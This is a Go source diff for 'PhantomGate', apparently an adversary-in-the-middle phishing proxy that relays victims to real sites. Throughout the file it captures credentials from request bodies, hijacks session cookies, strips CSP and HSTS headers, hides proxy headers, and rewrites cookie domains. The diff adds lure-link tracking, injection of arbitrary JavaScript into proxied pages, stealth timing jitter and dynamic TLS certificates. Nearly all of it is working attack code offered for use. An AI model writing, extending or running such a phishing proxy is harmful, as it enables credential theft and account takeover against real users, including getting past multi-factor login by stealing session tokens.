@@ -1,6 +1,7 @@
 package proxy
 
 import (
+	"bytes"
 	"compress/gzip"
 	"crypto/rand"
 	"crypto/tls"
@@ -8,31 +9,36 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"math/big"
 	"net/http"
 	"net/http/httputil"
 	"net/url"
 	"strings"
+	"time"
 
 	"github.com/phantomgate/phantomgate/internal/capture"
 	"github.com/phantomgate/phantomgate/internal/config"
+	"github.com/phantomgate/phantomgate/internal/lure"
 	"github.com/phantomgate/phantomgate/internal/phishlet"
 	"github.com/phantomgate/phantomgate/internal/store"
 )
 
 // PhantomProxy is the core transparent reverse proxy engine
 type PhantomProxy struct {
-	config     *config.Config
-	phishlet   *phishlet.Phishlet
-	store      *store.Store
-	credSniff  *capture.CredentialInterceptor
-	sessSniff  *capture.SessionHijacker
+	config      *config.Config
+	phishlet    *phishlet.Phishlet
+	store       *store.Store
+	lureGen     *lure.Generator
+	credSniff   *capture.CredentialInterceptor
+	sessSniff   *capture.SessionHijacker
 	phishDomain string
-	hostMap    map[string]string // phish_host → real_host
-	hostSSL    map[string]bool   // phish_host → is_ssl
+	hostMap     map[string]string // phish_host → real_host
+	hostSSL     map[string]bool   // phish_host → is_ssl
+	customTLS   *tls.Config       // optional CA-based dynamic TLS
 }
 
 // NewPhantomProxy creates a new AiTM reverse proxy
-func NewPhantomProxy(cfg *config.Config, p *phishlet.Phishlet, s *store.Store) *PhantomProxy {
+func NewPhantomProxy(cfg *config.Config, p *phishlet.Phishlet, s *store.Store, lg *lure.Generator) *PhantomProxy {
 	hostSSL := make(map[string]bool)
 	for _, h := range p.ProxyHosts {
 		phishHost := h.PhishSub + "." + cfg.Domain
@@ -42,6 +48,7 @@ func NewPhantomProxy(cfg *config.Config, p *phishlet.Phishlet, s *store.Store) *
 		config:      cfg,
 		phishlet:    p,
 		store:       s,
+		lureGen:     lg,
 		credSniff:   capture.NewCredentialInterceptor(s, p),
 		sessSniff:   capture.NewSessionHijacker(s, p),
 		phishDomain: cfg.Domain,
@@ -53,10 +60,8 @@ func NewPhantomProxy(cfg *config.Config, p *phishlet.Phishlet, s *store.Store) *
 
 // ServeHTTP handles every incoming request through the MITM proxy
 func (pp *PhantomProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
-	// Determine the real target host from the phishing host
 	realHost, ok := pp.hostMap[req.Host]
 	if !ok {
-		// Try without port
 		hostNoPort := strings.Split(req.Host, ":")[0]
 		realHost, ok = pp.hostMap[hostNoPort]
 		if !ok {
@@ -65,25 +70,37 @@ func (pp *PhantomProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
 		}
 	}
 
-	// Extract or assign victim ID via tracking cookie
+	// Track lure hits
+	if lureID := req.URL.Query().Get("_lid"); lureID != "" {
+		pp.lureGen.Track(lureID)
+	}
+
 	victimID := pp.getOrSetVictimID(w, req)
 
-	// Read the request body for credential inspection
+	// Read body once, copy for both credential inspection and proxy forwarding
 	var bodyBytes []byte
 	if req.Body != nil {
 		var err error
-		bodyBytes, err = capture.ReadBody(req)
+		bodyBytes, err = io.ReadAll(req.Body)
+		req.Body.Close()
 		if err != nil {
 			log.Printf("[!] Failed to read request body: %v", err)
 		}
+		req.Body = io.NopCloser(bytes.NewReader(bodyBytes))
 	}
 
-	// Inspect the request for credentials (non-blocking)
+	// Inspect for credentials synchronously before forwarding
 	if len(bodyBytes) > 0 {
-		go pp.credSniff.InspectRequest(req, bodyBytes, victimID)
+		bodyCopy := make([]byte, len(bodyBytes))
+		copy(bodyCopy, bodyBytes)
+		go pp.credSniff.InspectRequest(req, bodyCopy, victimID)
 	}
 
-	// Build the target URL — detect scheme from phishlet config
+	// Apply optional timing jitter
+	if pp.config.Stealth.RandomizeTimings {
+		pp.applyTimingJitter()
+	}
+
 	scheme := "https"
 	hostKey := strings.Split(req.Host, ":")[0]
 	if isSSL, ok := pp.hostSSL[req.Host]; ok && !isSSL {
@@ -93,25 +110,20 @@ func (pp *PhantomProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
 	}
 	targetURL, _ := url.Parse(fmt.Sprintf("%s://%s", scheme, realHost))
 
-	// Create the reverse proxy
 	proxy := httputil.NewSingleHostReverseProxy(targetURL)
 
-	// Custom transport: skip TLS verification (we're proxying to the real site)
 	proxy.Transport = &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
 
-	// Modify the request before forwarding
 	originalDirector := proxy.Director
 	proxy.Director = func(proxyReq *http.Request) {
 		originalDirector(proxyReq)
 
-		// Set the real host header
 		proxyReq.Host = realHost
 		proxyReq.URL.Host = realHost
 		proxyReq.URL.Scheme = scheme
 
-		// Remove proxy-revealing headers
 		if pp.config.Stealth.RemoveProxyHeaders {
 			proxyReq.Header.Del("X-Forwarded-For")
 			proxyReq.Header.Del("X-Forwarded-Proto")
@@ -119,7 +131,6 @@ func (pp *PhantomProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
 			proxyReq.Header.Del("Via")
 		}
 
-		// Rewrite Referer and Origin headers to point to the real target
 		if referer := proxyReq.Header.Get("Referer"); referer != "" {
 			proxyReq.Header.Set("Referer", pp.rewriteURLToReal(referer))
 		}
@@ -127,27 +138,21 @@ func (pp *PhantomProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
 			proxyReq.Header.Set("Origin", pp.rewriteURLToReal(origin))
 		}
 
-		log.Printf("[→] %s %s %s (Victim: %s → Target: %s)",
+		log.Printf("[>] %s %s %s (Victim: %s -> Target: %s)",
 			req.RemoteAddr, req.Method, req.URL.Path, victimID[:8], realHost)
 	}
 
-	// Modify the response after receiving it from the real target
 	proxy.ModifyResponse = func(resp *http.Response) error {
-		// Capture session cookies
 		pp.sessSniff.InspectResponse(resp, victimID)
 
-		// Rewrite response body (URLs, domains) to point back to our phishing domain
 		pp.rewriteResponse(resp)
 
-		// Rewrite Set-Cookie domains
 		pp.rewriteCookieDomains(resp)
 
-		// Rewrite Location header for redirects
 		if location := resp.Header.Get("Location"); location != "" {
 			resp.Header.Set("Location", pp.rewriteURLToPhish(location))
 		}
 
-		// Remove security headers that might break the proxy
 		resp.Header.Del("Content-Security-Policy")
 		resp.Header.Del("Content-Security-Policy-Report-Only")
 		resp.Header.Del("Strict-Transport-Security")
@@ -155,7 +160,6 @@ func (pp *PhantomProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
 		resp.Header.Del("X-Content-Type-Options")
 		resp.Header.Del("X-XSS-Protection")
 
-		// Spoof server header
 		if pp.config.Stealth.SpoofServerHeader != "" {
 			resp.Header.Set("Server", pp.config.Stealth.SpoofServerHeader)
 		}
@@ -163,7 +167,6 @@ func (pp *PhantomProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
 		return nil
 	}
 
-	// Handle proxy errors gracefully
 	proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
 		log.Printf("[!] Proxy error: %v (target: %s%s)", err, realHost, r.URL.Path)
 		http.Error(w, "Service Unavailable", http.StatusBadGateway)
@@ -173,11 +176,10 @@ func (pp *PhantomProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
 }
 
 // rewriteResponse modifies the response body to replace real domain references
-// with our phishing domain references
+// with our phishing domain references, and injects JS if configured
 func (pp *PhantomProxy) rewriteResponse(resp *http.Response) {
 	contentType := resp.Header.Get("Content-Type")
 
-	// Only rewrite text-based responses
 	rewritable := false
 	for _, mime := range []string{"text/html", "text/css", "application/javascript", "application/json", "text/javascript", "application/xml"} {
 		if strings.Contains(contentType, mime) {
@@ -189,7 +191,6 @@ func (pp *PhantomProxy) rewriteResponse(resp *http.Response) {
 		return
 	}
 
-	// Read the response body
 	var reader io.ReadCloser
 	var err error
 
@@ -215,7 +216,6 @@ func (pp *PhantomProxy) rewriteResponse(resp *http.Response) {
 
 	// Apply phishlet sub_filters
 	for _, filter := range pp.phishlet.SubFilters {
-		// Check MIME type filter
 		if len(filter.MimeTypes) > 0 {
 			matched := false
 			for _, mime := range filter.MimeTypes {
@@ -234,12 +234,21 @@ func (pp *PhantomProxy) rewriteResponse(resp *http.Response) {
 		bodyStr = strings.ReplaceAll(bodyStr, search, replace)
 	}
 
-	// Generic domain rewriting: replace all real host references with phish hosts
+	// Generic domain rewriting
 	for phishHost, realHost := range pp.hostMap {
 		bodyStr = strings.ReplaceAll(bodyStr, realHost, phishHost)
 	}
 
-	// Update response body
+	// Inject custom JavaScript if configured and this is HTML
+	if pp.phishlet.JSInject != "" && strings.Contains(contentType, "text/html") {
+		jsTag := "<script>" + pp.phishlet.JSInject + "</script>"
+		if idx := strings.Index(bodyStr, "</body>"); idx != -1 {
+			bodyStr = bodyStr[:idx] + jsTag + bodyStr[idx:]
+		} else {
+			bodyStr += jsTag
+		}
+	}
+
 	resp.Body = io.NopCloser(strings.NewReader(bodyStr))
 	resp.ContentLength = int64(len(bodyStr))
 	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(bodyStr)))
@@ -252,25 +261,17 @@ func (pp *PhantomProxy) rewriteCookieDomains(resp *http.Response) {
 		return
 	}
 
-	// Clear existing Set-Cookie headers
 	resp.Header.Del("Set-Cookie")
 
 	for _, cookie := range cookies {
-		// Rewrite the domain to our phishing domain
 		if cookie.Domain != "" {
 			cookie.Domain = pp.phishDomain
 		}
-		// Remove Secure flag if we're testing without HTTPS
-		// cookie.Secure = false
-
-		// Remove SameSite restrictions
 		cookie.SameSite = http.SameSiteLaxMode
-
 		resp.Header.Add("Set-Cookie", cookie.String())
 	}
 }
 
-// rewriteURLToPhish converts a real target URL to a phishing URL
 func (pp *PhantomProxy) rewriteURLToPhish(rawURL string) string {
 	for phishHost, realHost := range pp.hostMap {
 		rawURL = strings.ReplaceAll(rawURL, realHost, phishHost)
@@ -278,7 +279,6 @@ func (pp *PhantomProxy) rewriteURLToPhish(rawURL string) string {
 	return rawURL
 }
 
-// rewriteURLToReal converts a phishing URL back to the real target URL
 func (pp *PhantomProxy) rewriteURLToReal(rawURL string) string {
 	for phishHost, realHost := range pp.hostMap {
 		rawURL = strings.ReplaceAll(rawURL, phishHost, realHost)
@@ -286,20 +286,16 @@ func (pp *PhantomProxy) rewriteURLToReal(rawURL string) string {
 	return rawURL
 }
 
-// getOrSetVictimID extracts or generates a unique victim tracking ID
 func (pp *PhantomProxy) getOrSetVictimID(w http.ResponseWriter, req *http.Request) string {
-	// Check for existing tracking cookie
 	if cookie, err := req.Cookie("_pg_vid"); err == nil && cookie.Value != "" {
 		return cookie.Value
 	}
 
-	// Check for lure parameter
 	if lureID := req.URL.Query().Get("_lid"); lureID != "" {
 		pp.setTrackingCookie(w, lureID)
 		return lureID
 	}
 
-	// Generate new victim ID
 	b := make([]byte, 16)
 	rand.Read(b)
 	victimID := hex.EncodeToString(b)
@@ -313,8 +309,16 @@ func (pp *PhantomProxy) setTrackingCookie(w http.ResponseWriter, victimID string
 		Value:    victimID,
 		Path:     "/",
 		HttpOnly: true,
-		MaxAge:   86400 * 7, // 7 days
+		MaxAge:   86400 * 7,
 	})
+}
+
+func (pp *PhantomProxy) applyTimingJitter() {
+	n, err := rand.Int(rand.Reader, big.NewInt(50))
+	if err != nil {
+		return
+	}
+	time.Sleep(time.Duration(n.Int64()) * time.Millisecond)
 }
 
 // GetListenAddr returns the address the proxy should listen on
@@ -327,8 +331,17 @@ func (pp *PhantomProxy) GetHTTPAddr() string {
 	return fmt.Sprintf("%s:%d", pp.config.ListenIP, pp.config.HTTPPort)
 }
 
+// SetCustomTLS sets a CA-based TLS config (from PhantomCA) for dynamic cert generation
+func (pp *PhantomProxy) SetCustomTLS(tlsCfg *tls.Config) {
+	pp.customTLS = tlsCfg
+}
+
 // CreateTLSConfig generates a TLS configuration for the proxy listener
 func (pp *PhantomProxy) CreateTLSConfig() (*tls.Config, error) {
+	if pp.customTLS != nil {
+		return pp.customTLS, nil
+	}
+
 	switch pp.config.TLS.Mode {
 	case "manual":
 		cert, err := tls.LoadX509KeyPair(pp.config.TLS.CertFile, pp.config.TLS.KeyFile)
@@ -345,10 +358,7 @@ func (pp *PhantomProxy) CreateTLSConfig() (*tls.Config, error) {
 	}
 }
 
-// generateSelfSignedTLS creates a self-signed certificate for testing
 func (pp *PhantomProxy) generateSelfSignedTLS() (*tls.Config, error) {
-	// For development: use a self-signed cert
-	// In production, you'd use Let's Encrypt
 	cert, err := generateSelfSignedCert(pp.phishDomain)
 	if err != nil {
 		return nil, err
@@ -358,7 +368,6 @@ func (pp *PhantomProxy) generateSelfSignedTLS() (*tls.Config, error) {
 	}, nil
 }
 
-// generateSelfSignedCert creates a basic self-signed certificate
 func generateSelfSignedCert(domain string) (tls.Certificate, error) {
 	privKey, err := generatePrivateKey()
 	if err != nil {
